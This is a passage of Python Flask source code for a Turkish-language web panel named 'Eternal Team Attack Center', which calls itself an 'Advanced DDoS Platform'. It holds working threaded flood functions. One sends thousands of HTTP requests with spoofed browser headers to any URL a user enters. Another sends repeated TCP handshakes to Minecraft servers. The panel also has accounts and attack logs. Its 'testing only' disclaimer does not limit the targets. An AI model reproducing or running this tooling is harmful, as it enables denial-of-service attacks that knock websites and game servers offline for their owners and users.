    background: rgba(4,27,20,0.8);
    color: #00ff99;
    outline: none;
    transition: all 0.3s ease;
    font-family: 'Orbitron', monospace;
  }

  input[type=text]:focus, input[type=number]:focus {
    border-color: #33ffb8;
    box-shadow: 0 0 15px #33ffb8;
    transform: scale(1.02);
  }

  .attack-btn {
    width: 100%;
    padding: 20px 0;
    font-size: 1.4rem;
    font-weight: 800;
    border: none;
    border-radius: 18px;
    background: linear-gradient(45deg, #ff0066, #ff4444);
    color: white;
    cursor: pointer;
    box-shadow: 0 0 25px #ff0066;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 3px;
    font-family: 'Orbitron', monospace;
    position: relative;
    overflow: hidden;
  }

  .attack-btn:hover {
    background: linear-gradient(45deg, #ff4444, #ff0066);
    box-shadow: 0 0 40px #ff0066;
    transform: translateY(-3px);
  }

  .result {
    margin-top: 35px;
    padding: 25px;
    background: rgba(0,26,0,0.8);
    border-radius: 15px;
    border: 2px solid #00ff99;
    font-size: 1.1rem;
    white-space: pre-line;
    font-family: 'Share Tech Mono', monospace;
    text-align: left;
    animation: neonPulse 2s infinite alternate;
  }

  .logs-section {
    text-align: left;
  }

  .log-entry {
    background: rgba(0,255,153,0.1);
    border: 2px solid #00ff99;
    border-radius: 12px;
    padding: 20px;
    margin: 15px 0;
    transition: all 0.3s ease;
  }

  .log-entry:hover {
    background: rgba(0,255,153,0.15);
    transform: translateX(5px);
  }

  .log-entry h4 {
    margin: 0 0 15px 0;
    color: #33ffb8;
    font-size: 1.2rem;
    font-weight: 700;
  }

  .log-details {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.95rem;
    line-height: 1.6;
  }

  .footer {
    text-align: center;
    color: #004d33;
    margin-top: 60px;
    padding: 30px;
    background: rgba(0,0,0,0.9);
    border-top: 3px solid #00ff99;
    backdrop-filter: blur(10px);
  }

  .footer-content {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 40px;
    flex-wrap: wrap;
  }

  .footer-item {
    display: flex;
    align-items: center;
    gap: 10px;
    color: #00ff99;
    font-size: 1rem;
    opacity: 0.8;
  }

  .footer-icon {
    width: 25px;
    height: 25px;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 2px solid #00ff99;
    border-radius: 50%;
    font-size: 14px;
  }

  @media (max-width: 768px) {
    .form-grid { grid-template-columns: 1fr; }
    .user-section { flex-direction: column; text-align: center; }
    .nav-tabs { flex-direction: column; }
    .footer-content { flex-direction: column; gap: 20px; }
  }
</style>
<script>
function createMatrixRain() {
  const chars = '0123456789ETERNĀLTEAM01HACK<>[]{}()$#@!%&*ATTACK';
  const container = document.querySelector('.matrix-bg');

  for(let i = 0; i < 80; i++) {
    const char = document.createElement('div');
    char.className = 'matrix-char';
    char.textContent = chars[Math.floor(Math.random() * chars.length)];
    char.style.left = Math.random() * 100 + 'vw';
    char.style.animationDelay = Math.random() * 5 + 's';
    char.style.animationDuration = (Math.random() * 3 + 3) + 's';
    char.style.fontSize = (Math.random() * 6 + 10) + 'px';
    container.appendChild(char);
  }
}

function createDataStreams() {
  const container = document.querySelector('.data-stream');

  for(let i = 0; i < 12; i++) {
    const line = document.createElement('div');
    line.className = 'data-line';
    line.style.top = Math.random() * 100 + 'vh';
    line.style.width = Math.random() * 300 + 150 + 'px';
    line.style.animationDelay = Math.random() * 4 + 's';
    line.style.animationDuration = (Math.random() * 2 + 3) + 's';
    container.appendChild(line);
  }
}

function showTab(tabName) {
  const sections = document.querySelectorAll('.form-section');
  sections.forEach(section => section.classList.remove('active'));

  const tabs = document.querySelectorAll('.tab');
  tabs.forEach(tab => tab.classList.remove('active'));

  document.getElementById(tabName + '-section').classList.add('active');
  document.getElementById(tabName + '-tab').classList.add('active');
}

function showNavTab(tabName) {
  const sections = document.querySelectorAll('.main-section');
  sections.forEach(section => section.classList.remove('active'));

  const navTabs = document.querySelectorAll('.nav-tab');
  navTabs.forEach(tab => tab.classList.remove('active'));

  document.getElementById(tabName + '-main').classList.add('active');
  document.getElementById(tabName + '-nav').classList.add('active');
}

window.onload = function() {
  createMatrixRain();
  createDataStreams();
}
</script>
</head>
<body>
  <div class="matrix-bg"></div>
  <div class="attack-scan"></div>
  <div class="data-stream"></div>

  <div class="header">
    <div class="user-section">
      <div class="user-info">
        <span class="welcome-text">⚡ Hoş geldin, <span class="username-highlight">{{ username }}</span>! ⚡</span>
      </div>
      <div class="header-buttons">
        <a href="/" class="header-btn home">🏠 Ana Menü</a>
        <a href="/logout" class="header-btn">🚪 Çıkış Yap</a>
      </div>
    </div>
  </div>

  <div class="nav-tabs">
    <div class="nav-tab active" id="test-nav" onclick="showNavTab('test')">⚔️ Attack Center</div>
    <div class="nav-tab" id="logs-nav" onclick="showNavTab('logs')">📊 Battle Logs</div>
    <div class="nav-tab" id="stats-nav" onclick="showNavTab('stats')">📈 Statistics</div>
  </div>

  <div class="container">
    <!-- Test Araçları Bölümü -->
    <div class="main-section active" id="test-main">
      <h1 class="section-title">⚔️ Eternal Team Attack Center ⚔️</h1>

      <div class="attack-warning">
        ⚠️ UYARI: Bu araçlar sadece test amaçlıdır. Kendi sistemlerinizi test edin!
      </div>

      <div class="tab-container">
        <div class="tab active" id="website-tab" onclick="showTab('website')">🌐 Web Attack</div>
        <div class="tab" id="minecraft-tab" onclick="showTab('minecraft')">⛏️ MC Attack</div>
      </div>

      <!-- Web Sitesi Bölümü -->
      <div class="form-section active" id="website-section">
        <form method="POST" action="/website">
          <div class="form-grid">
            <div class="form-group full">
              <label for="target">🎯 Hedef URL:</label>
              <input type="text" id="target" name="target" placeholder="https://example.com" required>
            </div>
            <div class="form-group">
              <label for="count">💥 İstek Sayısı:</label>
              <input type="number" id="count" name="count" min="1" max="10000" value="500" required>
            </div>
            <div class="form-group">
              <label for="threads">⚡ Thread Sayısı:</label>
              <input type="number" id="threads" name="threads" min="1" max="100" value="25" required>
            </div>
          </div>
          <button type="submit" class="attack-btn">🚀 Web Attack Başlat</button>
        </form>
      </div>

      <!-- Minecraft Bölümü -->
      <div class="form-section" id="minecraft-section">
        <form method="POST" action="/minecraft">
          <div class="form-grid">
            <div class="form-group">
              <label for="mc_ip">🎮 MC Sunucu IP:</label>
              <input type="text" id="mc_ip" name="mc_ip" placeholder="play.example.com" required>
            </div>
            <div class="form-group">
              <label for="mc_port">🔌 Port:</label>
              <input type="number" id="mc_port" name="mc_port" min="1" max="65535" value="25565" required>
            </div>
            <div class="form-group">
              <label for="mc_count">💣 Paket Sayısı:</label>
              <input type="number" id="mc_count" name="mc_count" min="1" max="50000" value="2000" required>
            </div>
            <div class="form-group">
              <label for="mc_threads">⚡ Thread Sayısı:</label>
              <input type="number" id="mc_threads" name="mc_threads" min="1" max="100" value="30" required>
            </div>
          </div>
          <button type="submit" class="attack-btn">⛏️ Minecraft Attack Başlat</button>
        </form>
      </div>

      {% if result %}
      <div class="result">{{ result }}</div>
      {% endif %}
    </div>

    <!-- Test Geçmişi Bölümü -->
    <div class="main-section logs-section" id="logs-main">
      <h1 class="section-title">📊 Battle Logs</h1>
      {% if logs %}
        {% for log in logs %}
        <div class="log-entry">
          <h4>{{ log.type }} Attack - {{ log.date }}</h4>
          <div class="log-details">
            <strong>🎯 Hedef:</strong> {{ log.target }}<br>
            <strong>✅ Başarılı:</strong> {{ log.success }} | <strong>❌ Başarısız:</strong> {{ log.fail }}<br>
            <strong>⏱️ Süre:</strong> {{ log.duration }} saniye | <strong>⚡ Hız:</strong> {{ log.rate }}/saniye
          </div>
        </div>
        {% endfor %}
      {% else %}
        <p style="text-align: center; color: #666; padding: 40px;">Henüz saldırı geçmişin yok. İlk testini başlat!</p>
      {% endif %}
    </div>

    <!-- İstatistikler Bölümü -->
    <div class="main-section" id="stats-main">
      <h1 class="section-title">📈 Eternal Team Statistics</h1>
      <div class="log-entry">
        <h4>🏆 Kişisel İstatistiklerin</h4>
        <div class="log-details">
          <strong>💥 Toplam Testlerin:</strong> {{ user_stats.total_tests }}<br>
          <strong>🚀 Gönderilen İstek:</strong> {{ user_stats.total_requests }}<br>
          <strong>⚡ Ortalama Hız:</strong> {{ user_stats.avg_rate }}/saniye
        </div>
      </div>
    </div>
  </div>

  <div class="footer">
    <div class="footer-content">
      <div class="footer-item">
        <div class="footer-icon">⚡</div>
        <span>&copy; 2025 Eternal Team</span>
      </div>
      <div class="footer-item">
        <div class="footer-icon">💬</div>
        <a href="https://discord.gg/wDVqZJc8Qn" target="_blank" style="color: #00ff99;">Discord</a>
      </div>
      <div class="footer-item">
        <div class="footer-icon">🔥</div>
        <span>Advanced DDoS Platform</span>
      </div>
      <div class="footer-item">
        <div class="footer-icon">⚠️</div>
        <span>Sadece Test Amaçlı</span>
      </div>
    </div>
  </div>
</body>
</html>
"""

def send_web_requests(target, count, results):
    success = 0
    fail = 0
    for _ in range(count):
        try:
            r = requests.get(target, timeout=3, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive'
            })
            if r.status_code == 200:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
    results.append((success, fail))

def send_mc_packets(ip, port, count, results):
    success = 0
    fail = 0
    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            if result == 0:
                handshake = b'\x10\x00\x2F\x09' + ip.encode() + b'\x63\xDD\x01'
                sock.send(handshake)
                success += 1
            else:
                fail += 1
            sock.close()
        except:
            fail += 1
    results.append((success, fail))

def log_test(username, test_type, target, success, fail, duration, rate):
    logs = load_logs()
    if username not in logs:
        logs[username] = []

    log_entry = {
        'type': test_type,
        'target': target,
        'success': success,
        'fail': fail,
        'duration': duration,
        'rate': rate,
        'date': datetime.now().strftime('%d.%m.%Y %H:%M')
    }

    logs[username].append(log_entry)
    # Son 50 testi tut
    if len(logs[username]) > 50:
        logs[username] = logs[username][-50:]

    save_logs(logs)

    # Global stats güncelle
    stats = load_stats()
    stats['total_tests'] += 1
    stats['total_requests'] += success + fail
    users = load_users()
    stats['total_users'] = len(users)
    save_stats(stats)

def get_user_stats(username):
    logs = load_logs().get(username, [])
    total_tests = len(logs)
    total_requests = sum(log['success'] + log['fail'] for log in logs)
    avg_rate = round(sum(log['rate'] for log in logs) / total_tests, 2) if total_tests > 0 else 0

    return {
        'total_tests': total_tests,
        'total_requests': total_requests,
        'avg_rate': avg_rate
    }

@app.route("/", methods=["GET"])
def homepage():
    stats = load_stats()
    return render_template_string(HOMEPAGE_HTML, stats=stats)

@app.route("/auth", methods=["GET"])
def auth():
    return render_template_string(AUTH_HTML)

@app.route("/dashboard", methods=["GET"])
def dashboard():
    if 'username' not in session:
        return redirect('/auth')

    username = session['username']
    logs = load_logs().get(username, [])
    logs.reverse()  # En yeni testler üstte
    user_stats = get_user_stats(username)

    return render_template_string(DASHBOARD_HTML, username=username, logs=logs, user_stats=user_stats)

@app.route("/tools", methods=["GET"])
def tools():
    return "<h1 style='color: #00ff99; text-align: center; font-family: Orbitron; margin-top: 200px;'>🛠️ Hacker Tools - Yakında! 🛠️</h1><p style='text-align: center; color: #33ffb8;'><a href='/' style='color: #00ff99;'>← Ana Menüye Dön</a></p>"

@app.route("/api/stats", methods=["GET"])
def api_stats():
    stats = load_stats()
    return jsonify(stats)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    users = load_users()

    if username in users and users[username]['password'] == hash_password(password):
        session['username'] = username
        return redirect('/dashboard')
    else:
        flash('❌ Kullanıcı adı veya şifre hatalı!')
        return redirect('/auth')

@app.route("/register", methods=["POST"])
def register():
    username = request.form.get('username')
    password = request.form.get('password')
    password2 = request.form.get('password2')

    if password != password2:
        flash('❌ Şifreler eşleşmiyor!')
        return redirect('/auth')

    if len(password) < 4:
        flash('❌ Şifre en az 4 karakter olmalı!')
        return redirect('/auth')

    if len(username) < 3:
        flash('❌ Kullanıcı adı en az 3 karakter olmalı!')
        return redirect('/auth')

    users = load_users()

    if username in users:
        flash('❌ Bu kullanıcı adı zaten alınmış!')
        return redirect('/auth')

    users[username] = {
        'password': hash_password(password),
        'created': datetime.now().strftime('%d.%m.%Y %H:%M'),
        'total_tests': 0
    }

    save_users(users)
    session['username'] = username

    # Global stats güncelle
    stats = load_stats()
    stats['total_users'] = len(users)
    save_stats(stats)

    return redirect('/dashboard')

@app.route("/logout")
def logout():
    session.pop('username', None)
    return redirect('/')

@app.route("/website", methods=["POST"])
def website_attack():
    if 'username' not in session:
        return redirect('/auth')

    target = request.form.get("target")
    count = int(request.form.get("count", 500))
    thread_count = int(request.form.get("threads", 25))

    # Güvenlik kontrolleri
    if count > 10000:
        count = 10000
    if thread_count > 100:
        thread_count = 100

    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    results = []
    threads = []
    requests_per_thread = count // thread_count

    start_time = time.time()

    for i in range(thread_count):
        thread_requests = requests_per_thread
        if i == thread_count - 1:
            thread_requests += count % thread_count

        thread = threading.Thread(target=send_web_requests, args=(target, thread_requests, results))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    total_success = sum(r[0] for r in results)
    total_fail = sum(r[1] for r in results)
    duration = round(end_time - start_time, 2)
    rate = round(count/duration, 2)

    # Testi kaydet
    log_test(session['username'], 'Web Sitesi', target, total_success, total_fail, duration, rate)

    result_text = f"""🚀 ═══ WEB ATTACK TAMAMLANDI ═══ 🚀

🎯 Hedef: {target}
💥 Toplam İstek: {count:,}
⚡ Thread Sayısı: {thread_count}
✅ Başarılı: {total_success:,}
❌ Başarısız: {total_fail:,}
⏱️ Süre: {duration} saniye
🔥 Hız: {rate:,} istek/saniye

🏆 Eternal Team Attack Center tarafından gerçekleştirildi!"""

    username = session['username']
    logs = load_logs().get(username, [])
    logs.reverse()
    user_stats = get_user_stats(username)

    return render_template_string(DASHBOARD_HTML, username=username, logs=logs, result=result_text, user_stats=user_stats)

@app.route("/minecraft", methods=["POST"])
def minecraft_attack():
    if 'username' not in session:
        return redirect('/auth')

    ip = request.form.get("mc_ip")
    port = int(request.form.get("mc_port", 25565))
    count = int(request.form.get("mc_count", 2000))
    thread_count = int(request.form.get("mc_threads", 30))

    # Güvenlik kontrolleri
    if count > 50000:
        count = 50000
    if thread_count > 100:
        thread_count = 100

    results = []
    threads = []
    packets_per_thread = count // thread_count

    start_time = time.time()

    for i in range(thread_count):
        thread_packets = packets_per_thread
        if i == thread_count - 1:
            thread_packets += count % thread_count

        thread = threading.Thread(target=send_mc_packets, args=(ip, port, thread_packets, results))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    total_success = sum(r[0] for r in results)
    total_fail = sum(r[1] for r in results)
    duration = round(end_time - start_time, 2)
    rate = round(count/duration, 2)

    target = f"{ip}:{port}"

    # Testi kaydet
    log_test(session['username'], 'Minecraft', target, total_success, total_fail, duration, rate)

    result_text = f"""⛏️ ═══ MINECRAFT ATTACK TAMAMLANDI ═══ ⛏️

🎮 Hedef: {target}
💣 Toplam Paket: {count:,}
⚡ Thread Sayısı: {thread_count}
✅ Başarılı Bağlantı: {total_success:,}
❌ Başarısız Bağlantı: {total_fail:,}
⏱️ Süre: {duration} saniye
🔥 Hız: {rate:,} paket/saniye

🏆 Eternal Team MC Attack Center tarafından gerçekleştirildi!"""

    username = session['username']
    logs = load_logs().get(username, [])
    logs.reverse()
    user_stats = get_user_stats(username)

    return render_template_string(DASHBOARD_HTML, username=username, logs=logs, result=result_text, user_stats=user_stats)

if __name__ == "__main__":
    # İlk çalıştırmada global stats dosyası oluştur
    if not os.path.exists(STATS_FILE):
        save_stats({'total_tests': 0, 'total_requests': 0, 'total_users': 0})

    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port, debug=False)

